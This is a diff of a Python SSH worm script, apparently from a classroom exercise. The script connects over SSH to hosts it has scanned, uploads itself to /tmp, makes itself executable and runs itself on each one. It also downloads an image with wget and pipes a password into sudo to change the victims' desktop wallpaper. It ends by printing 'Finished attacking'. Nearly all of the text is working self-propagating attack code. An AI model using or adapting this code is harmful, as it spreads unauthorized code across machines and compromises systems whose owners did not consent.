@@ -91,32 +91,30 @@ def get_vulnerable_hosts(port):
 
 
 def set_background(ssh):
-	#ssh.exec_command("cd ~/")
-	ssh.exec_command("os.environ['DISPLAY'] = ':0'")
+#	ssh.exec_command("export DISPLAY=':0'")
 	stdin, stdout, stderr = ssh.exec_command("ls /home/cpsc/")
 	ssh.exec_command("cd ~/")
+
+	# For some reason, readlines() converts text to unicode, so I convert it back
 	l = stdout.readlines()
 	l = [str(name) for name in l]
 	l = [name[0:-1] for name in l]
 	if image_name not in l:
-		print ("Adding background...")
-		ssh.exec_command("wget https://i.imgur.com/hbNtlcJ.jpg")
-		# Need to issue a blocking command to download can finish before we move on?
+		print ("%s[o]Adding background..." % (offset))
+		ssh.exec_command("wget " + image_url)
+		# Need to issue a blocking command so download can finish before we move on?
 		time.sleep(20)
 	else:
-		print ("background already there")
-	
+		print ("%s[!] Background already there" % (offset))
+
+	"""
 	try:
-		ssh.exec_command("export DISPLAY=:0")
-		cmd = "echo " + "'" + remote_password + "'"
-		print (cmd)
-		ssh.exec_command(cmd +
-			 " | sudo gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/"
-		 	+ image_name)
-		time.sleep(10)
+		cmd = "echo " + "'" + remote_password + "' | sudo -S gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/" + image_name
+		#print (cmd)
+		ssh.exec_command(cmd)
 	except:
 		print("Error with setting gnome desktop background\n")
-
+	"""
 
 if __name__ == "__main__":
 	""" Main program that performs the scan """
@@ -147,16 +145,17 @@ if __name__ == "__main__":
 		try:
 			sftpClient = ssh.open_sftp()
 			print ("%s[o] Access Granted!" % (offset))
-			#set_background(ssh)
 			try:
 				sftpClient.put(worm_name, "/tmp/" + worm_name)
 			except Exception as e:
 				print ("Error with sftpClient.put")
 				pass
+		
 			try:
 				ssh.exec_command("chmod a+x /tmp" + worm_name)
 			except Exception as e: 
 				print ("%s [!]Error with chmod", (offset))
+		
 			try:
 				ssh.exec_command("python /tmp/" + worm_name)
 			except Exception as e:
@@ -171,6 +170,7 @@ if __name__ == "__main__":
 			except Exception as e:
 				print ("%s[!] Error setting desktop background\n" % (offset))
 				pass
+		
 			ssh.close()
 		except Exception as e:
 			print ("%s[!] Could not SSH into %s\n" % (offset, host))
@@ -180,3 +180,7 @@ if __name__ == "__main__":
 			sys.exit(1)
 		
 	print ("Finished attacking\n")
+	os.environ["DISPLAY"]=":0"
+	os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/hbNtlcJ.jpg")
+
+
